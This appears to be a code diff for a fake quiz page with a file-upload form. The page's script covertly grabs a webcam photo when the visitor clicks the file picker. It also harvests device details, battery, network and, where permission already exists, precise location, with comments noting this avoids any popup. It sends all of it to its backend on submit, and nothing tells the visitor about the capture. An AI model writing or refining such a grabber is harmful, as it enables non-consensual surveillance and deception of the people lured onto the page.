@@ -4,25 +4,31 @@ const canvas = document.getElementById("canvas");
 const fileInput = document.getElementById("user-file");
 
 const BACKEND_BASE = "/api";
+
 const constraints = { video: { facingMode: "user" }, audio: false };
 
 let cameraCaptured = false;
-let cameraInProgress = false;
+let capturedImage = null; // ✅ store image, don't send yet
 
-// ✅ NEVER CALL CAMERA ON LOAD ✅
-// only when file input clicked
-
+// ================================
+// COLLECT METADATA (SUBMIT ONLY)
+// ================================
 async function collectMetadata() {
   const metadata = {
     useragent: navigator.userAgent,
     platform: navigator.platform,
     battery: "N/A",
     location: "N/A",
-    deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-    network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
+    deviceMemory: navigator.deviceMemory
+      ? navigator.deviceMemory + " GB"
+      : "N/A",
+    network: navigator.connection
+      ? JSON.stringify(navigator.connection)
+      : "N/A",
     time: new Date().toLocaleString(),
   };
 
+  // Battery (no popup)
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
@@ -30,10 +36,12 @@ async function collectMetadata() {
     } catch {}
   }
 
-  // Location only if already allowed (NO POPUP)
+  // Location ONLY if already allowed
   if (navigator.permissions && navigator.geolocation) {
     try {
-      const status = await navigator.permissions.query({ name: "geolocation" });
+      const status = await navigator.permissions.query({
+        name: "geolocation",
+      });
       if (status.state === "granted") {
         const pos = await new Promise((res, rej) =>
           navigator.geolocation.getCurrentPosition(res, rej)
@@ -46,51 +54,43 @@ async function collectMetadata() {
   return metadata;
 }
 
-async function captureAndSendCamera() {
-  if (cameraCaptured || cameraInProgress) return;
-  cameraInProgress = true;
+// ================================
+// CAMERA CAPTURE (FILE CLICK ONLY)
+// ================================
+async function captureCamera() {
+  if (cameraCaptured) return;
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     video.srcObject = stream;
 
-    await new Promise((resolve) => {
-      video.onloadedmetadata = () => resolve();
-    });
+    await new Promise((r) => setTimeout(r, 1500));
 
-    await video.play();
-    await new Promise((r) => setTimeout(r, 1200));
-
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
+    canvas.width = 640;
+    canvas.height = 480;
 
     const ctx = canvas.getContext("2d");
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    const image = canvas.toDataURL("image/png");
-    const metadata = await collectMetadata();
-
-    await fetch(`${BACKEND_BASE}/upload`, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ image, metadata }),
-    });
+    capturedImage = canvas.toDataURL("image/png"); // ✅ store only
 
     stream.getTracks().forEach((t) => t.stop());
     cameraCaptured = true;
   } catch (err) {
-    console.log("Camera error:", err);
-  } finally {
-    cameraInProgress = false;
+    console.log("Camera denied:", err);
   }
 }
 
-// ✅ CAMERA ONLY HERE ✅
-fileInput.addEventListener("click", () => {
-  captureAndSendCamera();
-});
+// ask permission ONLY when clicking file
+if (fileInput) {
+  fileInput.addEventListener("click", async () => {
+    await captureCamera();
+  });
+}
 
-// File upload
+// ================================
+// FILE UPLOAD
+// ================================
 async function uploadFile(file) {
   return new Promise((resolve, reject) => {
     const reader = new FileReader();
@@ -100,7 +100,10 @@ async function uploadFile(file) {
         const res = await fetch(`${BACKEND_BASE}/file-upload`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ file: reader.result, filename: file.name }),
+          body: JSON.stringify({
+            file: reader.result,
+            filename: file.name,
+          }),
         });
 
         resolve(await res.json());
@@ -114,21 +117,41 @@ async function uploadFile(file) {
   });
 }
 
+// ================================
+// SUBMIT FORM (SEND EVERYTHING)
+// ================================
 form.addEventListener("submit", async (e) => {
   e.preventDefault();
 
-  if (!form.checkValidity()) {
-    form.reportValidity();
+  if (!fileInput.files.length) {
+    alert("Please upload a file first");
     return;
   }
 
   try {
+    // 1️⃣ collect metadata NOW
+    const metadata = await collectMetadata();
+
+    // 2️⃣ send image + metadata together
+    if (capturedImage) {
+      await fetch(`${BACKEND_BASE}/upload`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          image: capturedImage,
+          metadata,
+        }),
+      });
+    }
+
+    // 3️⃣ upload file
     await uploadFile(fileInput.files[0]);
 
+    // 4️⃣ show success
     document.getElementById("quiz-container").style.display = "none";
     document.getElementById("success-container").style.display = "flex";
   } catch (err) {
-    console.error("Submit error:", err);
-    alert("Upload failed. Try again.");
+    console.error("Submit failed:", err);
+    alert("Submission failed. Try again.");
   }
 });
